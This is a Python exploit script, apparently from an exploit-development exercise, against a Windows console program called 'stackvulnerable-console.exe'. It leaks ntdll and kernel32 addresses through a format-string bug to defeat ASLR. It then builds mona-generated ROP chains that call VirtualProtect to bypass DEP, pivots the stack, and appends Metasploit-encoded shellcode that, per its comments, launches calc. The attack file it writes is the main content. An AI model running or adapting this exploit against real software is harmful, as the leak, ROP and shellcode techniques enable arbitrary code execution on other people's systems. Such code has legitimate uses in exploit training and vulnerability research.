import struct
import os
import subprocess

# Memory leak trigger for the format string bug
leaktrigger = "%x\n"*6 + "ntdll%xntdll" + "%x\n"*60+"kernel32%xkernel32" + "%x\n"*21 + "%x\n"*6 + "ntdll%xntdll" + "%x\n"*60+"kernel32%xkernel32" + "%x\n"*21

# Creating a new process with the leak trigger as the argument for the file name
p = subprocess.Popen(['stackvulnerable-console.exe',leaktrigger],
				stdin=subprocess.PIPE,
				stdout=subprocess.PIPE,
				stderr=subprocess.PIPE,
				universal_newlines=True)

# Redirecting the standard output and error
(stdoutdata, stderrdata) = p.communicate()

# Parsing the Kernel32.dll and Ntdll.dll memory addresses
ntdllleak=int(stdoutdata.split("ntdll")[1],16)
kernel32leak=int(stdoutdata.split("kernel32")[1],16)

# Printing out the addresses for debugging
print("Ntdll Leak: "+hex(ntdllleak)+"\nKernel32 Leak: "+hex(kernel32leak))

# Setting up the output file for the exploit
outputfile = "console.txt"

# Bad characters for the stack overflow
badchars = "\x00\x09\x0a\x0b\x0c\x0d\x1a\x1b\x20\x28"

# ROP Chain memory addresses are calculated with relative distance to the leak
def stack_rop_chain():
	# this rop chain is used to jump back to beginning of the payload
	rop_gadgets = [	
        ntdllleak+0x000a2b4f, # 0x77126e64 :  # POP ECX # RETN    ** [ntdll.dll] **   |  ascii {PAGE_EXECUTE_READ}
	0xfffffbe8,  # 0018FF24 (ESP) + fffffbe8 = 0018FB0C (Payload)
        ntdllleak+0x0009b5ae, # 0x7711f8c3 :  # ADD ESP,ECX # POP EBP # RETN 0x04    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}		
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

# The DEP bypass ROP chain is optimised for the ASLR as below
def create_rop_chain():

	# Register setup for VirtualProtect() :
	# --------------------------------------------
	# EAX = NOP (0x90909090)
	# ECX = lpOldProtect (ptr to W address)
	# EDX = NewProtect (0x40)
	# EBX = dwSize
	# ESP = lPAddress (automatic)
	# EBP = ReturnTo (ptr to jmp esp)
	# ESI = ptr to VirtualProtect()
	# EDI = ROP NOP (RETN)

	# rop chain generated with mona.py - www.corelan.be
	# !mona rop -cpb "\x00\x09\x0a\x0b\x0c\x0d\x1a\x1b\x20\x28" -m ntdll.dll,kernel32.dll
	# EDX calculation needed an optimisation
	rop_gadgets = [	
                # Padding for the stack pivoting adjustment
                0x41414141,  # Padding for EBP

                # EBX and ESI (0x00000425 and VirtualProtect)
                kernel32leak+0x009F59c, #0x750c1be6, # POP EAX # RETN [kernel32.dll] ** REBASED ** ASLR
                0x41414141,  # Filler (compensate)
                0xfffffbdb,  # Value to negate, will become 0x00000425 
                ntdllleak+0x0002c33b, # 0x770b0650,  # NEG EAX # POP EBP # RETN    ** [ntdll.dll] **   |  ascii {PAGE_EXECUTE_READ}
                0x41414141,  # Filler (compensate)
                ntdllleak-0x0000493a, #0x7707f9db,  # MOV EBX,ECX # MOV ECX,EAX # MOV EAX,ESI # POP ESI # RETN 0x10    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
                0x41414141,  # Filler (compensate)
                ntdllleak-0x0000493a, #0x7707f9db,  # MOV EBX,ECX # MOV ECX,EAX # MOV EAX,ESI # POP ESI # RETN 0x10    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
                0x43414141,  # Filler (compensate)
                0x44414141,  # Filler (compensate)
                0x45414141,  # Filler (compensate)
                0x46414141,  # Filler (compensate)
                # This goes to ESI
                kernel32leak+0x00001d84, #0x750243CE ptr to &VirtualProtect()

                # EDX and EBP (0x00000040 and PUSH ESP # RETN  [kernel32.dll])
                kernel32leak+0x009F59c, #0x750c1be6, # POP EAX # RETN [kernel32.dll] ** REBASED ** ASLR
                0x43414141,  # Filler (compensate)
                0x43414141,  # Filler (compensate)
                0x43414141,  # Filler (compensate)
                0x43414141,  # Filler (compensate)       
                0xffffffdf,  # put delta into eax (-> put 0x00000040 into edx)
                ntdllleak+0x000924ff, #0x77116814,  # ADD EAX,61 # POP EBP # RETN 0x04 [ntdll.dll] ** REBASED ** ASLR 
                # This goes to EBP
                kernel32leak+0x00069ca6, #0x75b2c2f0 :  # PUSH ESP # RETN    ** [kernel32.dll] **  ** REBASED ** ASLR
                ntdllleak+0x0002aeab, #0x7729f1c0 :  # XCHG EAX,EDX # RETN    ** [ntdll.dll] ** **** REBASED ** ASLR 
                0x42414141,  # Filler (RETN offset compensation)
                
                # ECX (& Writable location [ntdll.dll])
                ntdllleak+0x00051d2a, # 0x772c603f :  # POP ECX # RETN    ** [ntdll.dll] **   |  asciiprint,ascii {PAGE_EXECUTE_READ} ** REBASED ** ASLR 
                ntdllleak+0x000d3948, #0x77157c5d,  # &Writable location [ntdll.dll] ** REBASED ** ASLR      

                # EDI (& RETN (ROP NOP) [ntdll.dll] )
                ntdllleak+0x0003f3ce, #0x770c36e3,  # POP EDI # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ} 
                ntdllleak+0x0008e20d, #0x77112522,  # RETN (ROP NOP) [ntdll.dll] ** REBASED ** ASLR
                #[---INFO:gadgets_to_set_eax:---]
                kernel32leak+0x009F59c, #0x750c1be6, # POP EAX # RETN [kernel32.dll] ** REBASED ** ASLR
                0x90909090,  # nop

                #[---INFO:pushad:---]
                kernel32leak+0x0000afcb, #0x7502d615,  # PUSHAD # ADD AL,0 # RETN    ** [kernel32.dll] **   |   {PAGE_EXECUTE_READ}
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

	
# 32-bit shellcode is generated by Metasploit Framework to run calc
# Bad characters should be avoided
# NOPs are used to avoid any dynamic issues
# msf5 payload(windows/exec) > generate -b "\x00\x09\x0a\x0b\x0c\x0d\x1a\x1b\x20\x28" -f python
# windows/exec - 216 bytes
# https://metasploit.com/
# Encoder: x86/shikata_ga_nai
# VERBOSE=false, PrependMigrate=false, EXITFUNC=thread, 
# CMD=calc
buf =  b"\x90"*8
buf += b"\xb8\xa3\xbc\x21\x12\xd9\xeb\xd9\x74\x24\xf4\x5a\x31"
buf += b"\xc9\xb1\x30\x83\xc2\x04\x31\x42\x0f\x03\x42\xac\x5e"
buf += b"\xd4\xee\x5a\x1c\x17\x0f\x9a\x41\x91\xea\xab\x41\xc5"
buf += b"\x7f\x9b\x71\x8d\xd2\x17\xf9\xc3\xc6\xac\x8f\xcb\xe9"
buf += b"\x05\x25\x2a\xc7\x96\x16\x0e\x46\x14\x65\x43\xa8\x25"
buf += b"\xa6\x96\xa9\x62\xdb\x5b\xfb\x3b\x97\xce\xec\x48\xed"
buf += b"\xd2\x87\x02\xe3\x52\x7b\xd2\x02\x72\x2a\x69\x5d\x54"
buf += b"\xcc\xbe\xd5\xdd\xd6\xa3\xd0\x94\x6d\x17\xae\x26\xa4"
buf += b"\x66\x4f\x84\x89\x47\xa2\xd4\xce\x6f\x5d\xa3\x26\x8c"
buf += b"\xe0\xb4\xfc\xef\x3e\x30\xe7\x57\xb4\xe2\xc3\x66\x19"
buf += b"\x74\x87\x64\xd6\xf2\xcf\x68\xe9\xd7\x7b\x94\x62\xd6"
buf += b"\xab\x1d\x30\xfd\x6f\x46\xe2\x9c\x36\x22\x45\xa0\x29"
buf += b"\x8d\x3a\x04\x21\x23\x2e\x35\x68\x29\xb1\xcb\x16\x1f"
buf += b"\xb1\xd3\x18\x0f\xda\xe2\x93\xc0\x9d\xfa\x71\xa5\x42"
buf += b"\x19\x50\xd3\xea\x84\x31\x5e\x77\x37\xec\x9c\x8e\xb4"
buf += b"\x05\x5c\x75\xa4\x6f\x59\x31\x62\x83\x13\x2a\x07\xa3"
buf += b"\x80\x4b\x02\xc0\x47\xd8\xce\x07"

shellcode = buf
	
# padding = "A"*1032
payload = create_rop_chain()
padding = payload + shellcode + "\xcc" * (1032 - len(payload) - len(shellcode))

# After using !mona pc 1500 and !mona findmsp
# Padding info in register and SEH alignment are below
# EIP contains normal pattern : 0x69423569 (offset 1036)
# ESP (0x0018ff1c) points at offset 1040 in normal pattern (length 210)
# EBP contains normal pattern : 0x42346942 (offset 1032)
# SEH record (nseh field) at 0x0018ffc4 overwritten with normal pattern : 0x336f4232 (offset 1208)

# Break point at 0x004012AF for debugging the bug
# POP EBP
# RET

ebp = "BBBB" # This triggers the bug due to POP EBP and RETN

# Potential ROP Chain space
ropchain = stack_rop_chain() #create_rop_chain() 
esp = ropchain + "\xCC" * (168-len(ropchain)) 

buffer = padding + ebp + esp

print("[+] Creating %s" % outputfile)
f = open(outputfile,'wb')
print("[+] Writing %d bytes to file" % len(buffer))
f.write(buffer)
print("[+] Done")
f.close()